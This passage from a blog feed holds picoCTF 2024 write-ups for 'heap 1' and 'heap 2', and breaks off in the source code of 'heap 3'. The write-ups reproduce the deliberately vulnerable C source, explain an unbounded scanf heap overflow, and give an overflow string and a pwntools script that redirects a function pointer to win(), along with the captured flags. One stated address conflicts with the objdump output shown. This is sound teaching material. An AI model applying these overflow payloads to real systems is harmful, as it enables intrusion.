class="built_in">strncpy</span>(safe_var, <span class="string">&quot;bico&quot;</span>, SAFE_VAR_SIZE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_buffer</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Data for buffer: &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, input_data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_heap</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Heap State:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;+-------------+----------------+\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Address   -&gt;   Heap Data   \n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;+-------------+----------------+\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]   %p  -&gt;   %s\n&quot;</span>, input_data, input_data);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;+-------------+----------------+\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]   %p  -&gt;   %s\n&quot;</span>, safe_var, safe_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;+-------------+----------------+\n&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Setup</span></span><br><span class="line">    init();</span><br><span class="line">    print_heap();</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> choice;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        print_menu();</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice) != <span class="number">1</span>) <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (choice) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="comment">// print heap</span></span><br><span class="line">            print_heap();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            write_buffer();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="comment">// print safe_var</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n\nTake a look at my variable: safe_var = %s\n\n&quot;</span>,</span><br><span class="line">                   safe_var);</span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="comment">// Check for win condition</span></span><br><span class="line">            check_win();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="comment">// exit</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Invalid choice\n&quot;</span>);</span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>The program allocates memory on the heap for two variables: <code>input_data</code> and <code>safe_var</code>, each being 5 bytes in size.</li><li><code>strncpy</code> copies initial values into these <em>buffers</em>.</li><li>The <code>write_buffer</code> function allows us to write to the <code>input_data</code> var using <code>scanf</code>.</li><li>The <code>check_win</code> function verifies that the <code>safe_var</code> var has been changed from <code>bico</code> to <code>pico</code>. If it is, then we get our flag.</li></ul><h2 id="Vulnerabilities"><a href="#Vulnerabilities" class="headerlink" title="Vulnerabilities"></a>Vulnerabilities</h2><p>There’s several vulnerabilities to note:</p><ul><li>The buffer for size for <code>input_data</code> and <code>safe_var</code> are only 5 bytes, meaning they should be easy to overflow.</li><li>The <code>scanf</code> library function does not limit our input size, meaning we can enter strings longer than 5 characters (this should be an instant giveaway that it will be a buffer overflow challenge).</li></ul><h2 id="Connecting-to-the-netcat-listener"><a href="#Connecting-to-the-netcat-listener" class="headerlink" title="Connecting to the netcat listener"></a>Connecting to the netcat listener</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&gt; nc tethys.picoctf.net 55943</span><br><span class="line"></span><br><span class="line">Thislcome to heap1!</span><br><span class="line">I put my data on the heap so it should be safe from any tampering.</span><br><span class="line">Since my data isn&#x27;t on the stack I&#x27;ll even let you write whatever info you want to the heap, I already took care of using malloc for you.</span><br><span class="line"></span><br><span class="line">Heap State:</span><br><span class="line">+-------------+----------------+</span><br><span class="line">[*] Address   -&gt;   Heap Data</span><br><span class="line">+-------------+----------------+</span><br><span class="line">[*]   0x63159a0182b0  -&gt;   pico</span><br><span class="line">+-------------+----------------+</span><br><span class="line">[*]   0x63159a0182d0  -&gt;   bico</span><br><span class="line">+-------------+----------------+</span><br><span class="line"></span><br><span class="line">1. Print Heap:(print the current state of the heap)</span><br><span class="line">2. Write to buffer:(write to your own personal block of data on the heap)</span><br><span class="line">3. Print safe_var:(I&#x27;ll even let you look at my variable on the heap, I&#x27;m confident it can&#x27;t be modified)</span><br><span class="line">4. Print Flag:(Try to print the flag, good luck)</span><br><span class="line">5. Exit</span><br><span class="line"></span><br><span class="line">Enter your choice:</span><br></pre></td></tr></table></figure><p>To clarify, <code>pico</code> and <code>bico</code> are the values inside the variables (<code>input_data</code> &amp; <code>safe_var</code> respectively) that were declared at the start. The reason that the variables are allocated with 5 bytes, despite only containing 4 characters, is because we need a <a href="https://en.wikipedia.org/wiki/Null_character">null character</a>.</p><p>To understand the distance between each variables, we subtract the address of <code>pico</code> with the address of <code>bico</code> (or vice verse).</p><p><code>0x63c3882552b0 - 0x63c3882552d0 = -0x20.</code> If we run <code>-0x20</code> through <a href="https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')To_Decimal('Space',false)&input=LTB4MjA">cyber chef</a> (from hex to decimal) we get a value of <code>32</code>. Because our initial hex value was negative, that means that <code>safe_var</code> is 32 bytes behind <code>input_data</code>.</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>This now know that <code>safe_var</code> is 32 bytes behind <code>input_data</code> so we just need to overflow the buffer with 32 characters, and then write ‘pico’ to get our flag.</p><p>For the sake of simplicity, it’s more efficient to use numbers for our characters. So instead of typing 32 <em>A’s</em> followed by ‘pico’: <code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApico</code>. This can just count in multiples of <em>5’s</em> (or whatever you prefer) and then write pico:</p><p>Our payloads: <code>12345123451234512345123451234512pico</code></p><ul><li>Six <code>5</code>‘s &#x3D; 30</li><li>30 + 2 &#x3D; 32 (you’ve reached <code>safe_var</code>)</li></ul><p>flag: <code>picoCTF&#123;starting_to_get_the_hang_79ee3270&#125;</code></p>]]></content>
    
    
    <summary type="html">Writing and understanding a buffer overflow payloads</summary>
    
    
    
    <category term="CTF" scheme="https://rivers.sh/categories/CTF/"/>
    
    <category term="picoCTF2024" scheme="https://rivers.sh/categories/CTF/picoCTF2024/"/>
    
    
    <category term="Medium" scheme="https://rivers.sh/tags/Medium/"/>
    
    <category term="Binary Exploitation" scheme="https://rivers.sh/tags/Binary-Exploitation/"/>
    
    <category term="Buffer Overflow" scheme="https://rivers.sh/tags/Buffer-Overflow/"/>
    
  </entry>
  
  <entry>
    <title>Heap 2</title>
    <link href="https://rivers.sh/posts/heap2/"/>
    <id>https://rivers.sh/posts/heap2/</id>
    <published>2024-10-22T04:00:00.000Z</published>
    <updated>2025-04-03T08:24:35.624Z</updated>
    
    <content type="html"><![CDATA[<hr><h2 id="Challenge-Info"><a href="#Challenge-Info" class="headerlink" title="Challenge Info"></a>Challenge Info</h2><p>Can you handle function pointers? Downloads the binary <a href="https://artifacts.picoctf.net/c_mimas/49/chall">here</a>. Downloads the source <a href="https://artifacts.picoctf.net/c_mimas/49/chall.c">here</a>.</p><p>Additional details will be available after launching your challenge instance.</p><h2 id="Understanding-chall-c"><a href="#Understanding-chall-c" class="headerlink" title="Understanding chall.c"></a>Understanding chall.c</h2><p>The code for your convenience:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLAGSIZE_MAX 64</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> num_allocs;</span><br><span class="line"><span class="type">char</span> *x;</span><br><span class="line"><span class="type">char</span> *input_data;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// Print flag</span></span><br><span class="line">    <span class="type">char</span> buf[FLAGSIZE_MAX];</span><br><span class="line">    FILE *fd = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    fgets(buf, FLAGSIZE_MAX, fd);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buf);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">check_win</span><span class="params">()</span> &#123; ((<span class="type">void</span> (*)())*(<span class="type">int</span>*)x)(); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_menu</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n1. Print Heap\n2. Write to buffer\n3. Print x\n4. Print Flag\n5. &quot;</span></span><br><span class="line">           <span class="string">&quot;Exit\n\nEnter your choice: &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nI have a function, I sometimes like to call it, maybe you should change it\n&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">    input_data = <span class="built_in">malloc</span>(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">strncpy</span>(input_data, <span class="string">&quot;pico&quot;</span>, <span class="number">5</span>);</span><br><span class="line">    x = <span class="built_in">malloc</span>(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">strncpy</span>(x, <span class="string">&quot;bico&quot;</span>, <span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_buffer</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Data for buffer: &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, input_data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_heap</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]   Address   -&gt;   Value   \n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;+-------------+-----------+\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]   %p  -&gt;   %s\n&quot;</span>, input_data, input_data);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;+-------------+-----------+\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]   %p  -&gt;   %s\n&quot;</span>, x, x);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Setup</span></span><br><span class="line">    init();</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> choice;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        print_menu();</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice) != <span class="number">1</span>) <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (choice) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="comment">// print heap</span></span><br><span class="line">            print_heap();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            write_buffer();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="comment">// print x</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n\nx = %s\n\n&quot;</span>, x);</span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="comment">// Check for win condition</span></span><br><span class="line">            check_win();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="comment">// exit</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Invalid choice\n&quot;</span>);</span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Defines a constant for the max size of the flag string (<code>FLAGSIZE_MAX</code>).</li><li>Two char pointers are declared: <code>x</code> is used to store a string, <code>input_data</code> stores user input- each being 5 bytes of size.</li><li>A <code>win()</code> function is declared. It reads the flag from a file (<code>flag.txt</code>) and prints it for us. It uses a buffer to store said flag, and ensures that it doesn’t exceed <code>FLAGSIZE_MAX</code></li><li>A <code>check_win()</code> is declared. It executes a function at the address stored in the <code>x</code> pointer.</li><li>The <code>init()</code> function allocates memory for <code>input_data</code> and <code>x</code>, and initializes them with the strings “pico” and “bico” respectively.</li><li>The <code>write_buffer()</code> function asks the use for input, which the function will then store in <code>input_data</code> using <code>scanf</code> (recall that <code>scanf</code> is unsafe, as it does not check for buffer overflows).</li></ul><h2 id="Vulnerabilities"><a href="#Vulnerabilities" class="headerlink" title="Vulnerabilities"></a>Vulnerabilities</h2><p>There’s several vulnerabilities to note:</p><ul><li>The <code>write_buffer()</code> function is using <code>scanf</code> to read user input. <code>scanf</code> is unsecure and can be overflowed.</li><li>The <code>input_data</code> and <code>x</code> buffer are allocated to hold only 5 bytes (4 bytes and then a null character)</li><li>The <code>check_win()</code> function executes code at the memory address being stored in <code>x</code>.</li></ul><h2 id="Connecting-to-the-netcat-listener"><a href="#Connecting-to-the-netcat-listener" class="headerlink" title="Connecting to the netcat listener"></a>Connecting to the netcat listener</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&gt; nc mimas.picoctf.net 55662</span><br><span class="line"></span><br><span class="line">I have a function, I sometimes like to call it, maybe you should change it</span><br><span class="line"></span><br><span class="line">1. Print Heap</span><br><span class="line">2. Write to buffer</span><br><span class="line">3. Print x</span><br><span class="line">4. Print Flag</span><br><span class="line">5. Exit</span><br><span class="line"></span><br><span class="line">Enter your choice: 1</span><br><span class="line">[*]   Address   -&gt;   Value</span><br><span class="line">+-------------+-----------+</span><br><span class="line">[*]   0x18572b0  -&gt;   pico</span><br><span class="line">+-------------+-----------+</span><br><span class="line">[*]   0x18572d0  -&gt;   bico</span><br><span class="line"></span><br><span class="line">1. Print Heap</span><br><span class="line">2. Write to buffer</span><br><span class="line">3. Print x</span><br><span class="line">4. Print Flag</span><br><span class="line">5. Exit</span><br><span class="line"></span><br><span class="line">Enter your choice:</span><br></pre></td></tr></table></figure><p>Again, <code>pico</code> and <code>bico</code> are the values inside the buffers (<code>input_data</code> &amp; <code>x</code> respectively) that were declared at the start. Again, the reason they’re declared to be 5 bytes, is to leave 1 byte for the null character.</p><p>Just like last time, we’re given the addresses. The only thing that’s different is that these are buffers instead of variables. Again, we’ll subtract the address of <code>pico</code> with the address of <code>bico</code>.</p><p><code>0x22b82b0 - 0x22b82d0 = -0x20</code>. When ran through <a href="https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')To_Decimal('Space',false)&input=LTB4MjA">cyber chef</a> (from hex to decimal) we get a value of 32. And because like last time, our initial hex value was negative, this means that <code>input_data</code> is 32 bytes behind <code>x</code>.</p><h2 id="The-Plan"><a href="#The-Plan" class="headerlink" title="The Plan"></a>The Plan</h2><p>This now know that <code>input_data</code> is 32 bytes behind <code>x</code>. Additionally, we know that the <code>check_win()</code> function executes a function at the address stored in the <code>x</code> pointer. Finally we know that if a <code>win()</code> function is declared, it’ll read us the flag.</p><p><em>So, in short, we want to:</em> overflow to reach the <code>x</code> pointer, and then get it to hold a value identical to the address of the <code>win()</code> function, so that when <code>check_win()</code> is automatically ran, instead of executing <em>‘bico’</em> at <code>x</code>, it will execute <code>win()</code>- thus giving us our flag.</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Before we write our payloads, we need to know the address corresponding to <code>win()</code>. A simple <a href="https://man7.org/linux/man-pages/man1/objdump.1.html">objdump</a> will reveal this:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; objdump -d ./chall | grep win</span><br><span class="line">00000000004011a0 &lt;win&gt;:</span><br><span class="line">00000000004011f0 &lt;check_win&gt;:</span><br></pre></td></tr></table></figure><p>This now know that <code>win()</code> is at <code>0x080484b6</code>. <strong>However</strong>, because of C’s memory layout, we need to consider C’s memory layout. C uses a little-endian system to ensure that the least significant bytes are placed first. Because of this, we want to input the address of <code>win()</code> in little-endian order.</p><p>Our payloads should look something like this:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Connect to the remote service</span></span><br><span class="line">p = remote(<span class="string">&quot;mimas.picoctf.net&quot;</span>, <span class="number">53827</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct the payloads</span></span><br><span class="line">payloads = <span class="string">b&quot;AAAA&quot;</span> * <span class="number">8</span> + <span class="string">b&quot;\xa0\x11\x40\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Send option &#x27;2&#x27; to allocate the object</span></span><br><span class="line">p.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wait for the server to ask for the buffer input</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;buffer:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Send the constructed payloads</span></span><br><span class="line">p.sendline(payloads)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wait for the next prompt (choice menu)</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;choice:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Send option &#x27;4&#x27; to check for win condition</span></span><br><span class="line">p.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Print the final output (possibly the flag)</span></span><br><span class="line"><span class="built_in">print</span>(p.recvall())</span><br></pre></td></tr></table></figure><p>flag: <code>picoCTF&#123;and_down_the_road_we_go_dde41590&#125;</code></p><hr>]]></content>
    
    
    <summary type="html">Utilizing a buffer overflow payloads to override pointers</summary>
    
    
    
    <category term="CTF" scheme="https://rivers.sh/categories/CTF/"/>
    
    <category term="picoCTF2024" scheme="https://rivers.sh/categories/CTF/picoCTF2024/"/>
    
    
    <category term="Medium" scheme="https://rivers.sh/tags/Medium/"/>
    
    <category term="Binary Exploitation" scheme="https://rivers.sh/tags/Binary-Exploitation/"/>
    
    <category term="Buffer Overflow" scheme="https://rivers.sh/tags/Buffer-Overflow/"/>
    
  </entry>
  
  <entry>
    <title>Heap 3</title>
    <link href="https://rivers.sh/posts/heap3/"/>
    <id>https://rivers.sh/posts/heap3/</id>
    <published>2024-10-22T04:00:00.000Z</published>
    <updated>2025-05-02T23:40:57.418Z</updated>
    
    <content type="html"><![CDATA[<hr><h2 id="Challenge-Info"><a href="#Challenge-Info" class="headerlink" title="Challenge Info"></a>Challenge Info</h2><p>This program mishandles memory. Can you exploit it to get the flag? Downloads the binary <a href="https://artifacts.picoctf.net/c_tethys/5/chall">here</a>. Downloads the source <a href="https://artifacts.picoctf.net/c_tethys/5/chall.c">here</a>.</p><p>Additional details will be available after launching your challenge instance.</p><h2 id="Understanding-chall-c"><a href="#Understanding-chall-c" class="headerlink" title="Understanding chall.c"></a>Understanding chall.c</h2><p>The code for your convenience:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLAGSIZE_MAX 64</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Create struct</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">char</span> a[<span class="number">10</span>];</span><br><span class="line">  <span class="type">char</span> b[<span class="number">10</span>];</span><br><span class="line">  <span class="type">char</span> c[<span class="number">10</span>];</span><br><span class="line">  <span class="type">char</span> flag[<span class="number">5</span>];</span><br><span class="line">&#125; object;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> num_allocs;</span><br><span class="line">object *x;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">check_win</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(x-&gt;flag, <span class="string">&quot;pico&quot;</span>)) &#123;</span><br><span class="line">    <span 